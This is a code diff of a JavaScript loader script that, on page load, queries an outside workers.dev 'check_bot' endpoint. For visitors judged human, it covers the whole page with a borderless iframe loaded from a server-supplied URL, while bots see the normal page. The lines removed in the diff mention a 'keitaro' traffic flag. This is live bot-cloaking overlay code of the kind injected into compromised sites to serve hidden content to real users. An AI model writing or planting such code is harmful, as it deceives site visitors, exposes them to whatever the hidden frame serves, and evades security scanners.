@@ -12,8 +12,8 @@ const createLoader = () => {
     frame.style.left = 0;
     frame.style.width = '100%';
     frame.style.height = '100%';
-    frame.style.zIndex = 9999;
-    const body = document.querySelector('html');
+    frame.style.zIndex = 9998;
+    const body = document.querySelector('body');
     if (body && body.childNodes.length > 0) {
         const parent = body;
         parent.insertBefore(frame, body.firstChild)
@@ -24,40 +24,31 @@ const toggleLoad = () => {
     const body = document.querySelector('body');
     if (body) {
         body.removeAttribute('hidden');
+	body.style.display = 'block';
+        body.style.visibility = 'visible';
+        body.style.opacity = '1';
+	
 
     }
     const load_frame = document.querySelector('#load_frame');
     if (load_frame) {
-        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
+        load_frame.remove();
     }
 
 };
 createLoader();
 
-window.addEventListener('message', (message) => {
-    console.log(message.data);
-    if (message.data?.bot) {
-        const wrapper = document.querySelector('#wrapper_frame');
-        console.log(wrapper);
-        wrapper.remove();
-        setTimeout(toggleLoad, 500);
 
-    }
-    if (message.data?.keitaro && !message.data?.bot) {
-        const body = document.querySelector('body');
-        body.remove()
-        setTimeout(toggleLoad, 500);
-
-    }
-
-})
 
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'r7pQDnCr')
+            createFrame(res.url + '/r7pQDnCr')
+			
+			
         } else {
             setTimeout(toggleLoad, 500);
+			
 
         }
 
@@ -66,20 +57,31 @@ window.addEventListener('DOMContentLoaded', () => {
 })
 
 
-
-
 function createFrame(data) {
     const frame = document.createElement('iframe');
     frame.setAttribute('src', data);
-    frame.setAttribute('width', '100%');
-    frame.setAttribute('height', '100vh');
     frame.setAttribute('id', 'wrapper_frame');
-    const html = document.querySelector('html');
-    html.style.overflow = 'hidden';
+    frame.style = `
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      border: none;
+      display: block;
+      z-index: 9999;
+    `;
+      
+    const body = document.querySelector('body');
+    body.style.overflow = 'hidden';
+    body.style.display = 'block';
+    body.style.visibility = 'visible';
+    body.style.opacity = '1';
+    body.removeAttribute('hidden');
 
     // body.innerHTML = '';
-    html.append(frame);
-    frame.style = 'width: 100%; height: 100vh;border: none;'
+    body.appendChild(frame);
+    
     const style = document.createElement('style');
     style.innerHTML = `
     
@@ -96,5 +98,7 @@ function createFrame(data) {
     }
   }
     `;
-    html.append(style)
+    document.head.appendChild(style);
+    setTimeout(toggleLoad, 500);
+    
 }
